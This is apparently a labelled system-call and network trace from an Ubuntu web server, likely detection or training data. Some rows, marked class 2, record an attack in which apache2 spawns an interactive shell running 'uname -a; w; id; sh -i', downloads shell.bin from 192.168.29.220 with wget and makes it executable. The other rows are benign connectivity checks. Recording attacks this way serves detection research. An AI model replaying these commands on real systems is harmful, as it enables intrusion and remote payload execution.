TIME,UID,COMM,PID,TID,RET,EVENT,ARGS,CLASS
00:57:00:035506,101,systemd-resolve,638,638,0,net_packet_dns_request,"metadata: {192.168.29.168 192.168.29.2 51923 53 17 75 any}, dns_questions: [{connectivity-check.ubuntu.com AAAA IN}]",0
00:57:01:411001,33,apache2,7533,7533,0,security_socket_connect,"sockfd: 12, type: SOCK_STREAM, remote_addr: map[sa_family:AF_INET sin_addr:192.168.29.220 sin_port:40704]",2
00:57:01:414441,33,sh,7884,7884,0,sched_process_exec,"cmdpath: /bin/sh, pathname: /usr/bin/dash, dev: 8388611, inode: 1441994, ctime: 1721354245362217420, inode_mode: 33261, interpreter_pathname: /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2, interpreter_dev: 8388611, interpreter_inode: 1443938, interpreter_ctime: 1739099281633624227, argv: [sh -c uname -a; w; id; sh -i], interp: /bin/sh, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: apache2, env: <nil>",2
00:57:01:415132,33,uname,7885,7885,0,sched_process_exec,"cmdpath: /usr/bin/uname, pathname: /usr/bin/uname, dev: 8388611, inode: 1443044, ctime: 1721354246753976525, inode_mode: 33261, interpreter_pathname: /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2, interpreter_dev: 8388611, interpreter_inode: 1443938, interpreter_ctime: 1739099281633624227, argv: [uname -a], interp: /usr/bin/uname, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",2
00:57:01:416653,33,w,7886,7886,0,sched_process_exec,"cmdpath: /usr/bin/w, pathname: /usr/bin/w, dev: 8388611, inode: 1443089, ctime: 1721354246793969675, inode_mode: 33261, interpreter_pathname: /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2, interpreter_dev: 8388611, interpreter_inode: 1443938, interpreter_ctime: 1739099281633624227, argv: [w], interp: /usr/bin/w, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",2
00:57:01:418788,33,w,7886,7886,0,security_socket_connect,"sockfd: 4, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",2
00:57:01:418830,33,w,7886,7886,0,security_socket_connect,"sockfd: 4, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",2
00:57:01:429530,33,id,7887,7887,0,sched_process_exec,"cmdpath: /usr/bin/id, pathname: /usr/bin/id, dev: 8388611, inode: 1442354, ctime: 1721354245934117240, inode_mode: 33261, interpreter_pathname: /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2, interpreter_dev: 8388611, interpreter_inode: 1443938, interpreter_ctime: 1739099281633624227, argv: [id], interp: /usr/bin/id, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",2
00:57:01:430333,33,id,7887,7887,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",2
00:57:01:430388,33,id,7887,7887,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",2
00:57:01:430460,33,id,7887,7887,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",2
00:57:01:430481,33,id,7887,7887,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",2
00:57:01:430958,33,sh,7888,7888,0,sched_process_exec,"cmdpath: /usr/bin/sh, pathname: /usr/bin/dash, dev: 8388611, inode: 1441994, ctime: 1721354245362217420, inode_mode: 33261, interpreter_pathname: /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2, interpreter_dev: 8388611, interpreter_inode: 1443938, interpreter_ctime: 1739099281633624227, argv: [sh -i], interp: /usr/bin/sh, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",2
00:57:01:432250,33,grep,7890,7890,0,sched_process_exec,"cmdpath: /usr/bin/grep, pathname: /usr/bin/grep, dev: 8388611, inode: 1442243, ctime: 1721354245730152969, inode_mode: 33261, interpreter_pathname: /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2, interpreter_dev: 8388611, interpreter_inode: 1443938, interpreter_ctime: 1739099281633624227, argv: [grep -e DocumentRoot -R /etc/apache2/sites-enabled/], interp: /usr/bin/grep, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",2
00:57:01:432479,33,awk,7891,7891,0,sched_process_exec,"cmdpath: /usr/bin/awk, pathname: /usr/bin/mawk, dev: 8388611, inode: 1442516, ctime: 1721354246046097792, inode_mode: 33261, interpreter_pathname: /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2, interpreter_dev: 8388611, interpreter_inode: 1443938, interpreter_ctime: 1739099281633624227, argv: [awk { print $3 }], interp: /usr/bin/awk, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",2
00:57:01:718194,33,wget,7892,7892,0,sched_process_exec,"cmdpath: /usr/bin/wget, pathname: /usr/bin/wget, dev: 8388611, inode: 1449210, ctime: 1721387193194059271, inode_mode: 33261, interpreter_pathname: /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2, interpreter_dev: 8388611, interpreter_inode: 1443938, interpreter_ctime: 1739099281633624227, argv: [wget -O ./shell.bin 192.168.29.220:43550/shell.bin], interp: /usr/bin/wget, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",2
00:57:01:721329,33,wget,7892,7892,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",2
00:57:01:721373,33,wget,7892,7892,0,security_socket_connect,"sockfd: 3, type: SOCK_STREAM, remote_addr: map[sa_family:AF_UNIX sun_path:/var/run/nscd/socket]",2
00:57:01:723121,33,wget,7892,7892,0,security_socket_connect,"sockfd: 4, type: SOCK_STREAM, remote_addr: map[sa_family:AF_INET sin_addr:192.168.29.220 sin_port:43550]",2
00:57:01:723764,33,wget,7892,7892,0,net_packet_http_request,"metadata: {192.168.29.168 192.168.29.220 42548 43550 6 196 any}, http_request: {GET HTTP/1.1 192.168.29.220:43550 /shell.bin map[Accept:[*/*] Accept-Encoding:[identity] Connection:[Keep-Alive] User-Agent:[Wget/1.21.2]] 0}",2
00:57:01:727542,0,swapper/3,0,0,0,net_packet_http_response,"metadata: {192.168.29.220 192.168.29.168 43550 42548 6 253 any}, http_response: {200 OK 200 HTTP/1.0 map[Content-Length:[207] Content-Type:[application/octet-stream] Date:[Tue, 04 Mar 2025 05:57:01 GMT] Last-Modified:[Tue, 04 Mar 2025 05:56:59 GMT] Server:[SimpleHTTP/0.6 Python/3.11.9]] 207}",2
00:57:01:955830,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 35, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:127.0.0.53 sin_port:53]",0
00:57:01:955990,0,NetworkManager,894,7893,0,net_packet_dns_request,"metadata: {127.0.0.1 127.0.0.53 59256 53 17 86 any}, dns_questions: [{connectivity-check.ubuntu.com A IN}]",0
00:57:01:956050,0,NetworkManager,894,7893,0,net_packet_dns_request,"metadata: {127.0.0.1 127.0.0.53 59256 53 17 86 any}, dns_questions: [{connectivity-check.ubuntu.com A IN}]",0
00:57:01:956152,0,NetworkManager,894,7893,0,net_packet_dns_request,"metadata: {127.0.0.1 127.0.0.53 59256 53 17 86 any}, dns_questions: [{connectivity-check.ubuntu.com AAAA IN}]",0
00:57:01:956196,0,NetworkManager,894,7893,0,net_packet_dns_request,"metadata: {127.0.0.1 127.0.0.53 59256 53 17 86 any}, dns_questions: [{connectivity-check.ubuntu.com AAAA IN}]",0
00:57:02:019819,33,chmod,7894,7894,0,sched_process_exec,"cmdpath: /usr/bin/chmod, pathname: /usr/bin/chmod, dev: 8388611, inode: 1441959, ctime: 1721354245342220923, inode_mode: 33261, interpreter_pathname: /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2, interpreter_dev: 8388611, interpreter_inode: 1443938, interpreter_ctime: 1739099281633624227, argv: [chmod 777 ./shell.bin], interp: /usr/bin/chmod, stdin_type: S_IFIFO, stdin_path: , invoked_from_kernel: 0, prev_comm: sh, env: <nil>",2
00:57:02:022627,33,chmod,7894,7894,0,fchmodat,"dirfd: -100, pathname: ./shell.bin, mode: S_IRWXU|S_IRWXG|S_IRWXO, flags: 0",2
00:57:02:038995,0,swapper/3,0,0,0,net_packet_dns_response,"metadata: {192.168.29.2 192.168.29.168 53 34462 17 435 any}, dns_response: [{{connectivity-check.ubuntu.com A IN} [{A 5 91.189.91.98} {A 5 185.125.190.48} {A 5 185.125.190.17} {A 5 185.125.190.18} {A 5 91.189.91.96} {A 5 91.189.91.49} {A 5 185.125.190.98} {A 5 185.125.190.96} {A 5 91.189.91.48} {A 5 185.125.190.97} {A 5 185.125.190.49} {A 5 91.189.91.97}]}]",0
00:57:02:040073,101,systemd-resolve,638,638,0,net_packet_dns_response,"metadata: {127.0.0.53 127.0.0.1 53 59256 17 446 any}, dns_response: [{{connectivity-check.ubuntu.com A IN} [{A 5 91.189.91.98} {A 5 185.125.190.48} {A 5 185.125.190.17} {A 5 185.125.190.18} {A 5 91.189.91.96} {A 5 91.189.91.49} {A 5 185.125.190.98} {A 5 185.125.190.96} {A 5 91.189.91.48} {A 5 185.125.190.97} {A 5 185.125.190.49} {A 5 91.189.91.97}]}]",0
00:57:02:040156,101,systemd-resolve,638,638,0,net_packet_dns_response,"metadata: {127.0.0.53 127.0.0.1 53 59256 17 446 any}, dns_response: [{{connectivity-check.ubuntu.com A IN} [{A 5 91.189.91.98} {A 5 185.125.190.48} {A 5 185.125.190.17} {A 5 185.125.190.18} {A 5 91.189.91.96} {A 5 91.189.91.49} {A 5 185.125.190.98} {A 5 185.125.190.96} {A 5 91.189.91.48} {A 5 185.125.190.97} {A 5 185.125.190.49} {A 5 91.189.91.97}]}]",0
00:57:02:040530,101,systemd-resolve,638,638,0,net_packet_dns_response,"metadata: {127.0.0.53 127.0.0.1 53 41105 17 446 any}, dns_response: [{{connectivity-check.ubuntu.com A IN} [{A 5 91.189.91.98} {A 5 185.125.190.48} {A 5 185.125.190.17} {A 5 185.125.190.18} {A 5 91.189.91.96} {A 5 91.189.91.49} {A 5 185.125.190.98} {A 5 185.125.190.96} {A 5 91.189.91.48} {A 5 185.125.190.97} {A 5 185.125.190.49} {A 5 91.189.91.97}]}]",0
00:57:02:040587,101,systemd-resolve,638,638,0,net_packet_dns_response,"metadata: {127.0.0.53 127.0.0.1 53 41105 17 446 any}, dns_response: [{{connectivity-check.ubuntu.com A IN} [{A 5 91.189.91.98} {A 5 185.125.190.48} {A 5 185.125.190.17} {A 5 185.125.190.18} {A 5 91.189.91.96} {A 5 91.189.91.49} {A 5 185.125.190.98} {A 5 185.125.190.96} {A 5 91.189.91.48} {A 5 185.125.190.97} {A 5 185.125.190.49} {A 5 91.189.91.97}]}]",0
00:57:02:042631,0,swapper/3,0,0,0,net_packet_dns_response,"metadata: {192.168.29.2 192.168.29.168 53 51923 17 523 any}, dns_response: [{{connectivity-check.ubuntu.com AAAA IN} [{AAAA 5 2620:2d:4000:1::23} {AAAA 5 2620:2d:4000:1::2a} {AAAA 5 2620:2d:4000:1::2b} {AAAA 5 2620:2d:4000:1::96} {AAAA 5 2001:67c:1562::24} {AAAA 5 2001:67c:1562::23} {AAAA 5 2620:2d:4000:1::98} {AAAA 5 2620:2d:4002:1::196} {AAAA 5 2620:2d:4000:1::97} {AAAA 5 2620:2d:4002:1::198} {AAAA 5 2620:2d:4000:1::22} {AAAA 5 2620:2d:4002:1::197}]}]",0
00:57:02:043160,101,systemd-resolve,638,638,0,net_packet_dns_response,"metadata: {127.0.0.53 127.0.0.1 53 41105 17 534 any}, dns_response: [{{connectivity-check.ubuntu.com AAAA IN} [{AAAA 5 2620:2d:4000:1::23} {AAAA 5 2620:2d:4000:1::2a} {AAAA 5 2620:2d:4000:1::2b} {AAAA 5 2620:2d:4000:1::96} {AAAA 5 2001:67c:1562::24} {AAAA 5 2001:67c:1562::23} {AAAA 5 2620:2d:4000:1::98} {AAAA 5 2620:2d:4002:1::196} {AAAA 5 2620:2d:4000:1::97} {AAAA 5 2620:2d:4002:1::198} {AAAA 5 2620:2d:4000:1::22} {AAAA 5 2620:2d:4002:1::197}]}]",0
00:57:02:043200,101,systemd-resolve,638,638,0,net_packet_dns_response,"metadata: {127.0.0.53 127.0.0.1 53 41105 17 534 any}, dns_response: [{{connectivity-check.ubuntu.com AAAA IN} [{AAAA 5 2620:2d:4000:1::23} {AAAA 5 2620:2d:4000:1::2a} {AAAA 5 2620:2d:4000:1::2b} {AAAA 5 2620:2d:4000:1::96} {AAAA 5 2001:67c:1562::24} {AAAA 5 2001:67c:1562::23} {AAAA 5 2620:2d:4000:1::98} {AAAA 5 2620:2d:4002:1::196} {AAAA 5 2620:2d:4000:1::97} {AAAA 5 2620:2d:4002:1::198} {AAAA 5 2620:2d:4000:1::22} {AAAA 5 2620:2d:4002:1::197}]}]",0
00:57:02:043479,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:91.189.91.98 sin_port:80]",0
00:57:02:043528,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:185.125.190.48 sin_port:80]",0
00:57:02:043542,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:185.125.190.17 sin_port:80]",0
00:57:02:043554,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:185.125.190.18 sin_port:80]",0
00:57:02:043534,101,systemd-resolve,638,638,0,net_packet_dns_response,"metadata: {127.0.0.53 127.0.0.1 53 59256 17 534 any}, dns_response: [{{connectivity-check.ubuntu.com AAAA IN} [{AAAA 5 2620:2d:4000:1::23} {AAAA 5 2620:2d:4000:1::2a} {AAAA 5 2620:2d:4000:1::2b} {AAAA 5 2620:2d:4000:1::96} {AAAA 5 2001:67c:1562::24} {AAAA 5 2001:67c:1562::23} {AAAA 5 2620:2d:4000:1::98} {AAAA 5 2620:2d:4002:1::196} {AAAA 5 2620:2d:4000:1::97} {AAAA 5 2620:2d:4002:1::198} {AAAA 5 2620:2d:4000:1::22} {AAAA 5 2620:2d:4002:1::197}]}]",0
00:57:02:043551,101,systemd-resolve,638,638,0,net_packet_dns_response,"metadata: {127.0.0.53 127.0.0.1 53 59256 17 534 any}, dns_response: [{{connectivity-check.ubuntu.com AAAA IN} [{AAAA 5 2620:2d:4000:1::23} {AAAA 5 2620:2d:4000:1::2a} {AAAA 5 2620:2d:4000:1::2b} {AAAA 5 2620:2d:4000:1::96} {AAAA 5 2001:67c:1562::24} {AAAA 5 2001:67c:1562::23} {AAAA 5 2620:2d:4000:1::98} {AAAA 5 2620:2d:4002:1::196} {AAAA 5 2620:2d:4000:1::97} {AAAA 5 2620:2d:4002:1::198} {AAAA 5 2620:2d:4000:1::22} {AAAA 5 2620:2d:4002:1::197}]}]",0
00:57:02:043565,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:91.189.91.96 sin_port:80]",0
00:57:02:043576,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:91.189.91.49 sin_port:80]",0
00:57:02:043588,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:185.125.190.98 sin_port:80]",0
00:57:02:043599,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:185.125.190.96 sin_port:80]",0
00:57:02:043611,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:91.189.91.48 sin_port:80]",0
00:57:02:043622,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:185.125.190.97 sin_port:80]",0
00:57:02:043655,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:185.125.190.49 sin_port:80]",0
00:57:02:043667,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:91.189.91.97 sin_port:80]",0
00:57:02:043714,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2620:2d:4000:1::23 sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
00:57:02:043756,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2620:2d:4000:1::2a sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
00:57:02:043738,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 35, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:91.189.91.98 sin_port:80]",0
00:57:02:043759,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 35, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:185.125.190.48 sin_port:80]",0
00:57:02:043770,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2620:2d:4000:1::2b sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
00:57:02:043784,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2620:2d:4000:1::96 sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
00:57:02:043796,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2001:67c:1562::24 sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
00:57:02:043771,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 35, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:185.125.190.17 sin_port:80]",0
00:57:02:043784,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 35, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:185.125.190.18 sin_port:80]",0
00:57:02:043795,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 35, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:91.189.91.96 sin_port:80]",0
00:57:02:043838,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2001:67c:1562::23 sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
00:57:02:043839,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 35, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:91.189.91.49 sin_port:80]",0
00:57:02:043853,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2620:2d:4000:1::98 sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
00:57:02:043853,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 35, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:185.125.190.98 sin_port:80]",0
00:57:02:043879,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 35, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:185.125.190.96 sin_port:80]",0
00:57:02:043884,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2620:2d:4002:1::196 sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
00:57:02:043890,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 35, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:91.189.91.48 sin_port:80]",0
00:57:02:043897,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2620:2d:4000:1::97 sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
00:57:02:043917,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2620:2d:4002:1::198 sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
00:57:02:043923,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 35, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:185.125.190.97 sin_port:80]",0
00:57:02:043955,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 35, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:185.125.190.49 sin_port:80]",0
00:57:02:043929,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2620:2d:4000:1::22 sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
00:57:02:043950,0,NetworkManager,894,7883,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2620:2d:4002:1::197 sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
00:57:02:043967,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 35, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET sin_addr:91.189.91.97 sin_port:80]",0
00:57:02:043993,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2620:2d:4000:1::23 sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
00:57:02:044031,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2620:2d:4000:1::2a sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
00:57:02:044045,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2620:2d:4000:1::2b sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
00:57:02:044057,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2620:2d:4000:1::96 sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
00:57:02:044089,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2001:67c:1562::24 sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
00:57:02:044101,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2001:67c:1562::23 sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
00:57:02:044113,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2620:2d:4000:1::98 sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
00:57:02:044125,0,NetworkManager,894,7893,0,security_socket_connect,"sockfd: 30, type: SOCK_DGRAM, remote_addr: map[sa_family:AF_INET6 sin6_addr:2620:2d:4002:1::196 sin6_flowinfo:0 sin6_port:80 sin6_scopeid:0]",0
